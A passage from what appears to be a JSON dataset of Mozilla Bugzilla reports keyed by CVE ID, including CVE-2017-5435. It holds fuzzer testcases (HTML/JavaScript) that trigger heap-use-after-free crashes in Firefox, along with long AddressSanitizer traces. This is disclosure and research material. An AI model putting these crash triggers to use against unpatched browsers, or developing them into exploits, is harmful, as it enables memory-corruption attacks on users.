o276=document.createRange(); o276.selectNode(o37); o303=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o83.appendChild(o303); o276.insertNode(o36); o56.contentWindow.onresize=fun0; o639=window.top.frames[0]; o640=o639.document; o641=o640.documentElement; o645=window.top.frames[2]; o703=document.createElementNS('http://www.w3.org/1999/xhtml','input'); o703.type='number'; o641.appendChild(o703); o703.focus(); } function fun0() { document.documentElement.appendChild(o703); window.fuzzPriv.CC(); window.fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==11515==ERROR: AddressSanitizer: heap-use-after-free on address 0x615000297cb0 at pc 0x7f3c5cb2be73 bp 0x7ffc1d1ee850 sp 0x7ffc1d1ee848 READ of size 4 at 0x615000297cb0 thread T0 (Web Content) #0 0x7f3c5cb2be72 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1596:12 #1 0x7f3c5cb2be72 in IsInUncomposedDoc /home/worker/workspace/build/src/dom/base/nsINode.h:546 #2 0x7f3c5cb2be72 in GetPrimaryFrame /home/worker/workspace/build/src/obj-firefox/dist/include/nsIContent.h:898 #3 0x7f3c5cb2be72 in nsFocusManager::CheckIfFocusable(nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1570 #4 0x7f3c5cb2adf7 in nsFocusManager::CheckIfFocusable(nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1542:12 #5 0x7f3c5cb33801 in nsFocusManager::Focus(nsPIDOMWindowOuter*, nsIContent*, unsigned int, bool, bool, bool, bool, nsIContent*) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1898:7 #6 0x7f3c5cb2959e in nsFocusManager::SetFocusInner(nsIContent*, int, bool, bool) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1354:5 #7 0x7f3c5cb2a964 in nsFocusManager::SetFocus(nsIDOMElement*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:486:3 #8 0x7f3c5c8c8550 in mozilla::dom::Element::Focus(mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Element.cpp:311:18 #9 0x7f3c5ea0f4fe in mozilla::dom::HTMLInputElement::Focus(mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3504:27 #10 0x7f3c5e0fc70b in mozilla::dom::HTMLElementBinding::focus(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:462:9 #11 0x7f3c5e3990be in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #12 0x7f3c63b2fe23 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #13 0x7f3c63b2fe23 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #14 0x7f3c63b307d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #15 0x7f3c6473b93e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #16 0x7f3c646f2464 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #17 0x7f3c6471bee3 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #18 0x7f3c6471e847 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #19 0x7f3c63b30173 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #20 0x7f3c63b30173 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #21 0x7f3c63b18669 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #22 0x7f3c63b18669 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #23 0x7f3c63afe5ce in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #24 0x7f3c63b2ffa8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #25 0x7f3c63b307d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #26 0x7f3c644ae4eb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #27 0x7f3c5de3c2e5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #28 0x7f3c5e79e74b in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #29 0x7f3c5e79e74b in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #30 0x7f3c5e76b482 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:51 #31 0x7f3c5e76d26a in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #32 0x7f3c5e7588a1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:16 #33 0x7f3c5e75bdf2 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #34 0x7f3c608844ec in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1043:7 #35 0x7f3c62c26929 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7671:21 #36 0x7f3c62c22b88 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7465:7 #37 0x7f3c62c29cdf in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7362:13 #38 0x7f3c5bad3d29 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1258:3 #39 0x7f3c5bad2cdc in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:842:14 #40 0x7f3c5bacfb78 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:732:9 #41 0x7f3c5bad19f2 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:614:5 #42 0x7f3c5bad271c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:470:14 #43 0x7f3c5a299e82 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:635:28 #44 0x7f3c5caeb95b in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8888:18 #45 0x7f3c5cb860ff in nsUnblockOnloadEvent::Run() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8839:11 #46 0x7f3c5a0b5f01 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:259:32 #47 0x7f3c5a0e7f10 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #48 0x7f3c5a0e4958 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #49 0x7f3c5ae89ee1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #50 0x7f3c5adeb080 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #51 0x7f3c5adeb080 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #52 0x7f3c5adeb080 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #53 0x7f3c600aa20f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #54 0x7f3c636e4117 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:854:22 #55 0x7f3c5adeb080 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #56 0x7f3c5adeb080 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #57 0x7f3c5adeb080 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #58 0x7f3c636e3b36 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:686:34 #59 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #60 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #61 0x7f3c755ef82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #62 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x615000297cb0 is located 48 bytes inside of 504-byte region [0x615000297c80,0x615000297e78) freed by thread T0 (Web Content) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f3c59f94297 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:25 #2 0x7f3c59f93e97 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7f3c59f9aebd in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3839:3 #4 0x7f3c59f9a6e1 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3661:9 #5 0x7f3c59f9d4b3 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4157:21 #6 0x7f3c5cbc9c92 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1452:3 #7 0x7f3c5c74121d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7f3c5a1026e1 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7f3c5b8f8134 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7f3c5b8f8134 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7f3c5b8f8134 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7f3c5b8ff2dc in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7f3c63b2fe23 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #14 0x7f3c63b2fe23 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #15 0x7f3c63b18669 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #16 0x7f3c63b18669 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #17 0x7f3c63afe5ce in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #18 0x7f3c63b2ffa8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #19 0x7f3c63b307d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #20 0x7f3c644ac7e3 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #21 0x7f3c5b841e1b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7f3c63b2fe23 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #23 0x7f3c63b2fe23 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #24 0x7f3c63b18669 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #25 0x7f3c63b18669 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #26 0x7f3c63afe5ce in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #27 0x7f3c63b2ffa8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #28 0x7f3c63b307d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #29 0x7f3c6473b93e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f3c646f2464 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #31 0x7f3c6471bee3 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #32 0x7f3c6471e847 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #33 0x7f3c63b30173 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #34 0x7f3c63b30173 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #35 0x7f3c63b307d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #36 0x7f3c644ae4eb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 previously allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f3c5e9deee9 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f3c5e9deee9 in NS_NewHTMLInputElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:126 #4 0x7f3c5eb71f59 in CreateHTMLElement /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:287:41 #5 0x7f3c5eb71f59 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:259 #6 0x7f3c5cb0cfc2 in nsIDocument::CreateHTMLElement(nsIAtom*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:12861:28 #7 0x7f3c60c9cf5a in nsNumberControlFrame::MakeAnonymousElement(mozilla::dom::Element**, nsTArray<nsIAnonymousContentCreator::ContentInfo>&, nsIAtom*, mozilla::CSSPseudoElementType) /home/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:332:40 #8 0x7f3c60c9d5c9 in nsNumberControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:379:8 #9 0x7f3c608312be in nsCSSFrameConstructor::GetAnonymousContent(nsIContent*, nsIFrame*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4224:26 #10 0x7f3c6082528a in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10984:3 #11 0x7f3c6083a2a0 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4079:9 #12 0x7f3c60844b6f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6247:3 #13 0x7f3c60826026 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10765:5 #14 0x7f3c60826026 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11069 #15 0x7f3c6082edb3 in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:12071:3 #16 0x7f3c6082b2ea in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2643:5 #17 0x7f3c6084dffa in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool, TreeMatchContext*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7859:7 #18 0x7f3c6084cac6 in nsCSSFrameConstructor::ContentInserted(nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7744:3 #19 0x7f3c607977c2 in mozilla::PresShell::Initialize(int, int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:1787:26 #20 0x7f3c6087f5aa in nsDocumentViewer::InitPresentationStuff(bool) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:722:12 #21 0x7f3c6088f3c9 in nsDocumentViewer::Show() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2123:12 #22 0x7f3c62c18559 in SetVisibility /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6513:9 #23 0x7f3c62c18559 in non-virtual thunk to nsDocShell::SetVisibility(bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6503 #24 0x7f3c5cb59be1 in nsFrameLoader::Show(int, int, int, int, nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:1139:15 #25 0x7f3c60bda431 in nsSubDocumentFrame::ShowViewer() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:185:22 #26 0x7f3c60c534ab in AsyncFrameInit::Run() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:92:60 #27 0x7f3c5c7063ef in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5266:15 #28 0x7f3c607b0548 in ~nsAutoScriptBlocker /home/worker/workspace/build/src/obj-firefox/dist/include/nsContentUtils.h:2961:5 #29 0x7f3c607b0548 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4185 #30 0x7f3c5cae4971 in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:599:5 #31 0x7f3c5cae4971 in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8032 #32 0x7f3c5cae4868 in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8028:22 #33 0x7f3c5cb2af1b in nsFocusManager::CheckIfFocusable(nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1552:8 #34 0x7f3c5cb278c2 in nsFocusManager::SetFocusInner(nsIContent*, int, bool, bool) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1182:41 #35 0x7f3c5cb2a964 in nsFocusManager::SetFocus(nsIDOMElement*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:486:3 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1596:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c2a8004af40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8004af50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8004af60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8004af70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8004af80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c2a8004af90: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd 0x0c2a8004afa0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8004afb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8004afc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c2a8004afd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2a8004afe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==11515==ABORTING"
      }
    ],
    "CVE-2017-5435": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1350683",
        "title": "heap-use-after-free in nsTransactionManager::EndTransaction",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170326014008) <script> function start() { o1=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o1.addEventListener('load', fun0,false); document.body.appendChild(o1); o2=window.document; } function fun0() { o4=o1.contentWindow; o5=o1.contentDocument; o16=o5.getElementsByTagName('*')[1]; o81=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o81.src='data:text/html,<div>'; o16.appendChild(o81); o90=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o90.src='data:text/html,<div>'; o90.addEventListener('load', fun2,false); o81.appendChild(o90); o1.contentWindow.onresize=fun1; o1.height='32px'; o4.stop(); } function fun1() { o2.designMode='on'; o2.execCommand('heading',false,'h1'); } function fun2() { o2.designMode='off'; o4.fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==12221==ERROR: AddressSanitizer: heap-use-after-free on address 0x614000142c60 at pc 0x7f2787ba2430 bp 0x7ffd783787c0 sp 0x7ffd783787b8 READ of size 8 at 0x614000142c60 thread T0 (Web Content) #0 0x7f2787ba242f in nsDeque::Pop() /home/worker/workspace/build/src/xpcom/ds/nsDeque.cpp:260:7 #1 0x7f278de14946 in Pop /home/worker/workspace/build/src/editor/txmgr/nsTransactionStack.cpp:57:58 #2 0x7f278de14946 in nsTransactionManager::EndTransaction(bool) /home/worker/workspace/build/src/editor/txmgr/nsTransactionManager.cpp:672 #3 0x7f278de13e29 in nsTransactionManager::DoTransaction(nsITransaction*) /home/worker/workspace/build/src/editor/txmgr/nsTransactionManager.cpp:80:8 #4 0x7f278dc3fdd4 in mozilla::EditorBase::DoTransaction(nsITransaction*) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:737:21 #5 0x7f278dc6f604 in mozilla::EditorBase::DeleteNode(nsINode*) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:1588:41 #6 0x7f278dc714dc in mozilla::EditorBase::MoveNode(nsIContent*, nsINode*, int) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:1785:17 #7 0x7f278dd1a78a in mozilla::HTMLEditRules::ApplyBlockStyle(nsTArray<mozilla::OwningNonNull<nsINode> >&, nsIAtom&) /home/worker/workspace/build/src/editor/libeditor/HTMLEditRules.cpp:6954:33 #8 0x7f278dce69e3 in mozilla::HTMLEditRules::WillMakeBasicBlock(mozilla::dom::Selection&, nsAString const&, bool*, bool*) /home/worker/workspace/build/src/editor/libeditor/HTMLEditRules.cpp:3593:10 #9 0x7f278dcce370 in mozilla::HTMLEditRules::WillDoAction(mozilla::dom::Selection*, mozilla::RulesInfo*, bool*, bool*) /home/worker/workspace/build/src/editor/libeditor/HTMLEditRules.cpp:649:14 #10 0x7f278dd5285f in mozilla::HTMLEditor::InsertBasicBlock(nsAString const&) /home/worker/workspace/build/src/editor/libeditor/HTMLEditor.cpp:2131:24 #11 0x7f278dd51d36 in mozilla::HTMLEditor::SetParagraphFormat(nsAString const&) /home/worker/workspace/build/src/editor/libeditor/HTMLEditor.cpp:1731:10 #12 0x7f278de22212 in nsParagraphStateCommand::SetState(nsIEditor*, nsString&) /home/worker/workspace/build/src/editor/composer/nsComposerCommands.cpp:648:22 #13 0x7f278de21671 in nsMultiStateCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) /home/worker/workspace/build/src/editor/composer/nsComposerCommands.cpp:595:12 #14 0x7f278c0b7f23 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) /home/worker/workspace/build/src/dom/commandhandler/nsControllerCommandTable.cpp:162:26 